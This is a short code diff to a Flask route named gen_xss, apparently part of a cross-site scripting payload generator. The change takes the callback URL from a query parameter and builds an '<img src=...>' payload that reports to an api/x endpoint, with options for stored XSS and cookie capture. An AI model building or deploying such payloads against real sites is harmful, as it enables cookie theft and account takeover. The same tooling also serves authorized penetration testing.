@@ -11,7 +11,6 @@ def gen_xss(id):
 
     client = Client.query.filter_by(id=id).first_or_404()
     uid = client.uid
-    url = request.url_root
     parameters = request.args.to_dict()
     other_data = ''
     xss_type = 'r'
@@ -23,7 +22,9 @@ def gen_xss(id):
 
     for param, value in parameters.items():
 
-        if param == 'stored':
+        if param == 'url':
+            url = value
+        elif param == 'stored':
             xss_type = 's'
         elif param == 'cookies':
             cookies = True
@@ -62,7 +63,7 @@ def gen_xss(id):
             payload += '<img src="'
 
 
-    payload += '{}api/x/{}/{}'.format(url, xss_type, uid)
+    payload += '{}/api/x/{}/{}'.format(url, xss_type, uid)
 
     if require_params:
         payload += '?'
